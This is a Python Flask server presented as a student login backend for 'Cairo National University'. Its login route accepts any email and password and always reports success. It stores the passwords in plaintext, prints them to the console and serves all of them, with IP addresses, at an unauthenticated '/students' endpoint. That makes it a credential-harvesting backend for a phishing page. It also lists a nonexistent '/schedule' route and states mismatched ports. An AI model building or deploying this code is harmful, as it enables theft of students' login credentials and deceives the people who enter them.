"""
Cairo National University - Student Login Backend
Flask + SQLite
Run: python app.py
"""

from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import sqlite3
import os
import io
from datetime import datetime

app = Flask(__name__)
CORS(app)  # Allow requests from the HTML frontend

DB_PATH = "students.db"

# ── DATABASE SETUP ────────────────────────────────────────────────────────────

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    """Create the students table if it doesn't exist."""
    with get_db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS students (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                email       TEXT    NOT NULL,
                password    TEXT    NOT NULL,
                ip_address  TEXT,
                login_count INTEGER DEFAULT 1,
                first_login TEXT    NOT NULL,
                last_login  TEXT    NOT NULL
            )
        """)
        conn.commit()
    print("[DB] Database initialised ✓")

# ── ROUTES ────────────────────────────────────────────────────────────────────

@app.route("/login", methods=["POST"])
def login():
    """
    Accept any email + password.
    If email is new  → INSERT a new student record.
    If email exists  → UPDATE last_login and login_count.
    Always returns 200 so the user is 'logged in'.
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Invalid request body"}), 400

    email    = (data.get("email", "") or "").strip().lower()
    password = (data.get("password", "") or "").strip()

    if not email or not password:
        return jsonify({"error": "Email and password are required"}), 400

    ip  = request.remote_addr
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with get_db() as conn:
        row = conn.execute(
            "SELECT id, login_count FROM students WHERE email = ? AND password = ?",
            (email, password)
        ).fetchone()

        if row is None:
            # New student record for this email/password pair
            conn.execute("""
                INSERT INTO students (email, password, ip_address, first_login, last_login)
                VALUES (?, ?, ?, ?, ?)
            """, (email, password, ip, now, now))
            conn.commit()
            print(f"[NEW]  {email} | pwd: {password} | ip: {ip} | {now}")
            action = "registered"
        else:
            # Returning student with same email/password → update login metadata only
            conn.execute("""
                UPDATE students
                SET last_login  = ?,
                    login_count = login_count + 1,
                    ip_address  = ?
                WHERE id = ?
            """, (now, ip, row["id"]))
            conn.commit()
            print(f"[RTRN] {email} | pwd: {password} | ip: {ip} | {now} (login #{row['login_count']+1})")
            action = "logged_in"

    return jsonify({
        "success": True,
        "action": action,
        "message": "Login successful"
    }), 200


@app.route("/students", methods=["GET"])
def list_students():
    """
    Admin endpoint — view all collected login data.
    Access via: http://localhost:5000/students
    """
    with get_db() as conn:
        rows = conn.execute(
            "SELECT id, email, password, ip_address, login_count, first_login, last_login FROM students ORDER BY id DESC"
        ).fetchall()

    students = [dict(r) for r in rows]
    return jsonify({
        "total": len(students),
        "students": students
    }), 200


@app.route("/", methods=["GET"])
def index():
    return jsonify({"status": "CNU Backend running ✓", "endpoints": ["/login", "/schedule", "/students"]}), 200


# ── ENTRY POINT ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    init_db()
    print("=" * 55)
    print("  Cairo National University — Backend Server")
    print("  Running on  : http://localhost:5001")
    print("  Admin panel : http://localhost:5001/students")
    print("=" * 55)
    app.run(debug=False, host="0.0.0.0", port=5001)
